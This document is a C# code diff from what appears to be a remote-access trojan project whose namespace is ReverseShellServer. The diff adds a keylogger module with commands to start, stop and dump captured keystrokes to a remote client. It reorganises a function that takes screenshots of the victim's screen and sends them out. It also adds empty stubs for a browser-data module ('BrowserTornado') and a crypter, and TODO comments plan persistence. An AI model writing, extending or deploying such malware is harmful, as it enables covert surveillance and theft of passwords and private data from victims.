@@ -6,6 +6,9 @@ using System.IO;
 using System.Linq;
 using System.Net;
 using System.Runtime.InteropServices;
+using BrowserTornado;
+using Crypter;
+using KeyLogger;
 
 namespace ReverseShellServer
 {
@@ -14,73 +17,34 @@ namespace ReverseShellServer
         readonly BinaryWriter bw;
         readonly BinaryReader br;
         readonly StreamWriter sw;
-        readonly StreamReader sr;
 
-        public ServerTools(BinaryWriter bw, BinaryReader br, StreamWriter sw, StreamReader sr)
+        KeyLoggerManager keyLoggerManager;
+        BrowserTornadoManager browserTornadoManager;
+        CrypterManager crypterManager;
+
+
+
+        /// <summary>
+        /// Constructor
+        /// </summary>
+        /// <param name="bw"></param>
+        /// <param name="br"></param>
+        /// <param name="sw"></param>
+        /// <param name="keyLoggerManager"></param>
+        public ServerTools(BinaryWriter bw, BinaryReader br, StreamWriter sw)
         {
             this.bw = bw;
             this.br = br;
             this.sw = sw;
-            this.sr = sr;
+
+            // The keyLoggerManager must be instanciated in the UI thread
+            keyLoggerManager = MainWindow.keyLoggerManager;
+
+            //browserTornadoManager = new BrowserTornadoManager();
+            //crypterManager = new CrypterManager();
         }
 
-
-        public void TakeAndSendScreenShotToClient()
-        {
-            sw.WriteLine("{Screenshot:init}");
-            sw.Flush();
-            
-            using (var ms = new MemoryStream())
-            {
-                var bounds = GetScreenRectangle();
-                using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
-                {
-                    using (var graphics = Graphics.FromImage(bitmap))
-                    {
-                        graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
-                    }
-
-                    bitmap.Save(ms, ImageFormat.Png);
-                }
-
-
-                // Send the data length first
-                bw.Write((int)ms.Length);
-                bw.Flush();
-
-                // Reset memory stream position
-                ms.Position = 0;
-                var buffer = new byte[4096];
-                int bytesRead;
-                while ((bytesRead = ms.Read(buffer, 0, buffer.Length)) > 0)
-                {
-                    bw.Write(buffer, 0, bytesRead);
-                }
-
-                bw.Flush();
-            }
-        }
-
-
-        static Rectangle GetScreenRectangle()
-        {
-            try
-            {
-                // Resolve DPI issue (altered screen resolution)
-                if (Environment.OSVersion.Version.Major >= 6)
-                {
-                    SetProcessDpiAwareness(ProcessDPIAwareness.ProcessPerMonitorDPIAware);
-                }
-            }
-            catch (EntryPointNotFoundException)
-            {
-                // Exception occures if OS does not implement this API, just ignore it
-            }
-
-            return new Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-        }
-
-
+        #region File functions
         public void DownloadFileFromUrl(string url)
         {
             sw.WriteLine("{UrlDownload:init}");
@@ -185,6 +149,66 @@ namespace ReverseShellServer
 
             sw.Flush();
         }
+        #endregion File functions
+
+
+        #region Misc functions
+
+        #region Screenshot
+        public void TakeAndSendScreenShotToClient()
+        {
+            sw.WriteLine("{Screenshot:init}");
+            sw.Flush();
+
+            using (var ms = new MemoryStream())
+            {
+                var bounds = GetScreenRectangle();
+                using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
+                {
+                    using (var graphics = Graphics.FromImage(bitmap))
+                    {
+                        graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                    }
+
+                    bitmap.Save(ms, ImageFormat.Png);
+                }
+
+
+                // Send the data length first
+                bw.Write((int)ms.Length);
+                bw.Flush();
+
+                // Reset memory stream position
+                ms.Position = 0;
+                var buffer = new byte[4096];
+                int bytesRead;
+                while ((bytesRead = ms.Read(buffer, 0, buffer.Length)) > 0)
+                {
+                    bw.Write(buffer, 0, bytesRead);
+                }
+
+                bw.Flush();
+            }
+        }
+
+
+        static Rectangle GetScreenRectangle()
+        {
+            try
+            {
+                // Resolve DPI issue (altered screen resolution)
+                if (Environment.OSVersion.Version.Major >= 6)
+                {
+                    SetProcessDpiAwareness(ProcessDPIAwareness.ProcessPerMonitorDPIAware);
+                }
+            }
+            catch (EntryPointNotFoundException)
+            {
+                // Exception occures if OS does not implement this API, just ignore it
+            }
+
+            return new Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+        }
 
 
         enum ProcessDPIAwareness
@@ -194,7 +218,86 @@ namespace ReverseShellServer
             ProcessPerMonitorDPIAware = 2
         }
 
+
         [DllImport("shcore.dll")]
         private static extern int SetProcessDpiAwareness(ProcessDPIAwareness value);
+        #endregion Screenshot
+
+        // TODO : play sound
+        // TODO : change wallpaper
+        // TODO : execute program ?? (can do with cmd without blocking it ? else implement it to create a new process)
+        // TODO : persistance
+
+        #endregion Misc functions
+
+
+        #region Modules functions
+
+        #region Keylogger
+        public void ProcessKeyloggerCommand(string command)
+        {
+            switch (command)
+            {
+                case "start":
+                    StartKeylogger();
+                    break;
+                case "stop":
+                    StopKeylogger();
+                    break;
+                case "status":
+                    SendKeyloggerStatusToClient();
+                    break;
+                case "dump":
+                    SendKeyLogsToClient();
+                    break;
+            }
+        }
+
+
+        void StartKeylogger()
+        {
+            keyLoggerManager.StartListening();
+        }
+
+
+        void StopKeylogger()
+        {
+            keyLoggerManager.StopListening();
+        }
+
+
+        void SendKeyloggerStatusToClient()
+        {
+            sw.WriteLine("{Keylogger:status}");
+            sw.Flush();
+
+            var status = keyLoggerManager.GetStatus();
+
+            sw.WriteLine(status ? "The keylogger is running" : "The keylogger isn't started");
+            sw.Flush();
+        }
+
+
+        void SendKeyLogsToClient()
+        {
+            sw.WriteLine("{Keylogger:dump}");
+            sw.Flush();
+
+            var logs = MainWindow.keyLoggerManager.DumpLogs(); //keyLoggerManager.DumpLogs();
+
+            sw.WriteLine(logs);
+            sw.Flush();
+        }
+        #endregion Keylogger
+
+        #region BrowserTornado
+
+        #endregion BrowserTornado
+
+        #region Crypter
+
+        #endregion Crypter
+
+        #endregion Modules functions
     }
 }
